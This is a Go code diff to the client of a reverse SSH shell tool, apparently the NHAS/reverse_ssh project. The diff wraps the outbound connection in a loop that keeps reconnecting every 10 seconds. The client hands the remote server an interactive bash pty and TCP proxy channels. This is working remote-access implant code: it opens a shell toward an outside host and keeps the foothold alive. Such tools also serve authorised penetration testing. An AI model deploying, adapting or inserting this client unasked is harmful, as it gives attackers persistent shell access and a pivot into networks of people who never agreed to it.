@@ -1,4 +1,4 @@
-package main
+package client
 
 import (
 	"crypto/ed25519"
@@ -11,12 +11,14 @@ import (
 	"net"
 	"os/exec"
 	"sync"
+	"time"
 
+	"github.com/NHAS/reverse_ssh/internal"
 	"github.com/kr/pty"
 	"golang.org/x/crypto/ssh"
 )
 
-func client(addr, serverPubKey string) {
+func Run(addr, serverPubKey string) {
 
 	_, priv, err := ed25519.GenerateKey(rand.Reader)
 	if err != nil {
@@ -50,39 +52,52 @@ func client(addr, serverPubKey string) {
 				return nil
 			}
 
-			if FingerprintSHA256Hex(key) != serverPubKey {
-				return fmt.Errorf("Server public key invalid, expected: %s, got: %s", serverPubKey, FingerprintSHA256Hex(key))
+			if internal.FingerprintSHA256Hex(key) != serverPubKey {
+				return fmt.Errorf("Server public key invalid, expected: %s, got: %s", serverPubKey, internal.FingerprintSHA256Hex(key))
 			}
 
 			return nil
 		},
 	}
 
-	log.Println("Connecting to ", addr)
-	conn, err := net.DialTimeout("tcp", addr, config.Timeout)
-	if err != nil {
-		log.Fatal(err)
+	for {
+		log.Println("Connecting to ", addr)
+		conn, err := net.DialTimeout("tcp", addr, config.Timeout)
+		if err != nil {
+			log.Printf("Unable to connect TCP: %s\n", err)
+			<-time.After(10 * time.Second)
+			continue
+		}
+		defer conn.Close()
+
+		sshConn, chans, reqs, err := ssh.NewClientConn(conn, addr, config)
+		if err != nil {
+			log.Printf("Unable to start a new client connection: %s\n", err)
+			<-time.After(10 * time.Second)
+			continue
+		}
+		defer sshConn.Close()
+
+		go ssh.DiscardRequests(reqs) // Then go on to ignore everything else
+
+		err = internal.HandleChannels(sshConn, chans, map[string]internal.ChannelHandler{
+			"session":      clientHandleNewChannel,
+			"direct-tcpip": clientHandleProxyChannel,
+		})
+		if err != nil {
+			log.Printf("Server disconnected unexpectedly: %s\n", err)
+			<-time.After(10 * time.Second)
+			continue
+		}
+
 	}
-
-	sshConn, chans, reqs, err := ssh.NewClientConn(conn, addr, config)
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer sshConn.Close()
-
-	go ssh.DiscardRequests(reqs) // Then go on to ignore everything else
-
-	handleChannels(sshConn, chans, map[string]channelHandler{
-		"session":      clientHandleNewChannel,
-		"direct-tcpip": clientHandleProxyChannel,
-	})
 
 }
 
 func clientHandleProxyChannel(sshConn ssh.Conn, newChannel ssh.NewChannel) {
 	a := newChannel.ExtraData()
 
-	var drtMsg channelOpenDirectMsg
+	var drtMsg internal.ChannelOpenDirectMsg
 	err := ssh.Unmarshal(a, &drtMsg)
 	if err != nil {
 		log.Println(err)
@@ -174,14 +189,14 @@ func clientHandleNewChannel(sshConn ssh.Conn, newChannel ssh.NewChannel) {
 			}
 		case "pty-req":
 			termLen := req.Payload[3]
-			w, h := parseDims(req.Payload[termLen+4:])
-			SetWinsize(bashf.Fd(), w, h)
+			w, h := internal.ParseDims(req.Payload[termLen+4:])
+			internal.SetWinsize(bashf.Fd(), w, h)
 			// Responding true (OK) here will let the client
 			// know we have a pty ready for input
 			req.Reply(true, nil)
 		case "window-change":
-			w, h := parseDims(req.Payload)
-			SetWinsize(bashf.Fd(), w, h)
+			w, h := internal.ParseDims(req.Payload)
+			internal.SetWinsize(bashf.Fd(), w, h)
 		}
 	}
 
